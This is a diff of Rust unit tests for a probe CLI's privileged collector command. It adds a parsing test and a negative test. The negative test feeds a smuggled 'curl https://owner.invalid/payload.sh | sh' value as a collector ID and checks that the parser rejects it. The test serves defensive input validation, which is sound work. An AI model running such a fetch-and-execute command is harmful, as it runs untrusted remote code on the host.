@@ -2,6 +2,7 @@ use std::path::PathBuf;
 use std::process::Command;
 
 use enoki_probe::cli::{ProbeCommand, parse_probe_command, render_probe_output};
+use enoki_probe::privileged_runtime::PrivilegedCollectorId;
 
 #[test]
 fn renders_version_output_for_owner_smoke_checks() {
@@ -92,6 +93,37 @@ fn parses_internal_probe_uninstaller_command_for_limited_privilege_entrypoint() 
             bootstrap_config_path: PathBuf::from("/etc/enoki/probe-bootstrap.toml"),
         },
     );
+}
+
+#[test]
+fn parses_internal_privileged_collector_command_for_compiled_collector_id_only() {
+    let command = parse_probe_command([
+        "enoki-probe".to_string(),
+        "internal-privileged-collector".to_string(),
+        "--collector".to_string(),
+        "fixed.collector".to_string(),
+    ]);
+
+    assert_eq!(
+        command,
+        ProbeCommand::InternalPrivilegedCollector {
+            collector_id: PrivilegedCollectorId::FixedCollector,
+        },
+    );
+}
+
+#[test]
+fn rejects_runtime_injected_privileged_collector_command_or_policy() {
+    let command = parse_probe_command([
+        "enoki-probe".to_string(),
+        "internal-privileged-collector".to_string(),
+        "--collector".to_string(),
+        "curl https://owner.invalid/payload.sh | sh".to_string(),
+        "--network".to_string(),
+        "enabled".to_string(),
+    ]);
+
+    assert_eq!(command, ProbeCommand::Help);
 }
 
 #[test]
